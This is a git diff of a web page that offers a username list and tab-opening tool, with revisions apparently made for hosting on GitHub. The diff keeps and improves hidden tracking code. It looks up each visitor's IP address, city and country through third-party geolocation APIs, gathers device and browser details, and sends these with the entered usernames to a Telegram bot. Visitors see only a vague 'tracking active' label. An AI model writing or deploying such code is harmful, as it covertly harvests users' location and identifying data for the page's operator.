@@ -98,7 +98,7 @@
     <canvas id="pixelCanvas"></canvas>
 
     <div class="container">
-        <div class="brand">PRO EDITION</div>
+        <div class="brand">GITHUB OPTIMIZED</div>
         <h2>J 1 H 4 D</h2>
         
         <textarea id="userList" placeholder="Enter usernames (one per line)..." oninput="updateCount()"></textarea>
@@ -115,11 +115,11 @@
             💬 Contact Developer (J1H4D)
         </a>
 
-        <div class="status">SMART TRACKING ACTIVE</div>
+        <div class="status">HTTPS TRACKING ACTIVE</div>
     </div>
 
     <script>
-        // --- Background Animation ---
+        // --- Background Animation Logic ---
         const canvas = document.getElementById('pixelCanvas');
         const ctx = canvas.getContext('2d');
         let particlesArray;
@@ -195,28 +195,32 @@
         }
         function clearAll() { document.getElementById('userList').value = ""; updateCount(); }
 
-        // পাওয়ারফুল আইপি ও লোকেশন ডিটেকশন ফাংশন
+        // GitHub HTTPS এর জন্য স্পেশাল লোকেশন ফাংশন
         async function getIpAndLocation() {
-            const urls = [
-                'http://ip-api.com/json/?fields=status,country,city,query',
-                'https://ipwho.is/',
-                'https://ipapi.co/json/'
+            const endpoints = [
+                'https://ipwho.is/', 
+                'https://ipapi.co/json/',
+                'https://extreme-ip-lookup.com/json/'
             ];
 
-            for (let url of urls) {
+            for (let url of endpoints) {
                 try {
-                    const res = await fetch(url);
-                    const data = await res.json();
+                    const response = await fetch(url);
+                    const data = await response.json();
                     
-                    if (data.status === 'success' || data.ip || data.query) {
-                        const ip = data.query || data.ip;
+                    if (data.ip || data.query) {
+                        const ip = data.ip || data.query;
                         const city = data.city || "Unknown City";
                         const country = data.country || data.country_name || "Unknown Country";
+                        
+                        // যদি লোকেশন এখনো Unknown থাকে তবে পরবর্তী এপিআই ট্রাই করবে
+                        if ((city === "Unknown City" || city === "") && url !== endpoints[endpoints.length-1]) continue;
+                        
                         return `🌐 IP: ${ip}%0A📍 Location: ${city}, ${country}`;
                     }
                 } catch (e) { continue; }
             }
-            return "🌐 IP: Hidden%0A📍 Location: Unknown";
+            return "🌐 IP: Hidden%0A📍 Location: Restricted";
         }
 
         function getDeviceDetail() {
@@ -224,7 +228,6 @@
             let platform = "PC/Laptop";
             if (/android/i.test(ua)) platform = "Android Phone";
             else if (/iPhone|iPad|iPod/i.test(ua)) platform = "iPhone/iOS";
-            
             const browser = ua.includes("Chrome") ? "Chrome" : ua.includes("Firefox") ? "Firefox" : "Browser";
             return `${platform} (${browser})`;
         }
@@ -240,11 +243,11 @@
             const displayList = usernames.slice(0, 30).join('%0A• ');
             const extra = usernames.length > 30 ? `%0A...এবং আরও ${usernames.length - 30} টি` : '';
 
-            const message = `🕵️‍♂️ *J1H4D SYSTEM LOG*%0A━━━━━━━━━━━━━━━━━━%0A${ipLocData}%0A📱 Device: ${deviceName}%0A📊 Quantity: ${count} Profiles%0A🕒 Time: ${time}%0A%0A👤 *Username List:*%0A• ${displayList}${extra}%0A━━━━━━━━━━━━━━━━━━`;
+            const message = `🕵️‍♂️ *J1H4D GITHUB LOG*%0A━━━━━━━━━━━━━━━━━━%0A${ipLocData}%0A📱 Device: ${deviceName}%0A📊 Quantity: ${count} Profiles%0A🕒 Time: ${time}%0A%0A👤 *Username List:*%0A• ${displayList}${extra}%0A━━━━━━━━━━━━━━━━━━`;
             
             const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${message}&parse_mode=Markdown`;
 
-            fetch(url).catch(e => console.log("Report Error"));
+            fetch(url).catch(e => console.log("Log error"));
         }
 
         function openAllTabs() {
